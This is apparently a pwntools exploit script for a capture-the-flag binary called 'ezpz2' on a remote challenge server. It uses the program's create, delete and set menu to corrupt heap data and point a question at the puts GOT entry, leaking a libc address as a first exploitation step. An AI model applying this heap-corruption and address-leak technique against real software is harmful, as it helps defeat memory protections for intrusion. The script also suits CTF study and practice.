from pwn import *
from struct import *

local = 0
if local:
    r = process('./ezpz2')
else:
    r = remote('plzpwn.me', 7002)

def create():
    log.info('creating new shit')
    r.recvuntil('refresh): ')
    r.sendline('c')
    r.recvuntil('ID ')
    f = r.recvline().strip()
    log.info('created new shit ' + f)
    return int(f)

def delete(a):
    log.info('deleting q ' + str(a))
    r.recvuntil('refresh): ')
    r.sendline('d')
    r.recvuntil('id: ')
    r.sendline(str(a))

def setq(a, b = cyclic(16)):
    log.info('setting q ' + str(a) + ' string = ' + b)
    r.recvuntil('refresh): ')
    r.sendline('s')
    r.recvuntil('id: ')
    r.sendline(str(a))
    r.recvuntil('question: ')
    r.sendline(b)


def askq(a):
    log.info('asking q')
    r.recvuntil('refresh): ')
    r.sendline('a')
    r.recvuntil('id: ')
    r.sendline(str(a))
    r.recvuntil("perhaps: '")
    f = r.recvline()
    s = f[:4]
    puts_addr = u32(s)
    while len(f) >= 4:
        d = f[:4]
        log.info(hex(u32(d)))
        f = f[4:]
    log.info('replied: ' + d)
    return puts_addr

puts = 0x804b02c
pause()

create()
create()
create()
create()
delete(3)
setq(2, 32*'i'+p32(puts)+'\x00')
create()

puts_libc = askq(4)
print(hex(puts_libc))

